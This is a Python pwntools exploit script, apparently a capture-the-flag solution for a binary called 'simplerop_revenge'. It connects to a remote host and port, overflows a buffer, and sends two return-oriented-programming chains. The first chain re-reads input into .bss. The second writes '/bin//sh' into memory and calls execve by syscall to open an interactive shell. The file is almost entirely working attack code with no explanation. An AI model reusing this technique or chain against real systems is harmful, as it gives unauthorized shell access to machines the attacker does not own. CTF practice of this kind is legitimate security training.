#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./simplerop_revenge"
# elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 2124)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug == 1:
    gdbcmd = '''
    b *0x400989

    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

context.log_level ='debug'




# read Again
bss = 0x00000000006ca080
rbp = bss - 0x500

p = b'a' * 0x20 + p64(rbp)
p += p64(0x00000000004427e6) # pop rdx ; ret
p += p64(0x400)
p += p64(0x0000000000401577) # pop rsi ; ret
p += p64(rbp + 0x8)
p += p64(0x400979) # main read
c.send(flat(p,length=0xa0))

# execve generated by ROPgadget
p = b''
p += p64(0x0000000000401577) # pop rsi ; ret
p += p64(0x00000000006c9a20) # @ .data
p += p64(0x0000000000478516) # pop rax ; pop rdx ; pop rbx ; ret
p += b'/bin//sh'
p += p64(0x4141414141414141) # padding
p += p64(0x4141414141414141) # padding
p += p64(0x0000000000473fc1) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000401577) # pop rsi ; ret
p += p64(0x00000000006c9a28) # @ .data + 8
p += p64(0x0000000000425fef) # xor rax, rax ; ret
p += p64(0x0000000000473fc1) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000401456) # pop rdi ; ret
p += p64(0x00000000006c9a20) # @ .data
p += p64(0x0000000000478516) # pop rax ; pop rdx ; pop rbx ; ret
p += p64(0x3b)
p += p64(0x4141414141414141) # padding
p += p64(0x4141414141414141) # padding
p += p64(0x0000000000401577) # pop rsi ; ret
p += p64(0x00000000006c9a28) # @ .data + 8
p += p64(0x00000000004427e6) # pop rdx ; ret
p += p64(0x00000000006c9a28) # @ .data + 8
p += p64(0x000000000040037a) # syscall

c.send(p)




c.interactive()
c.close()
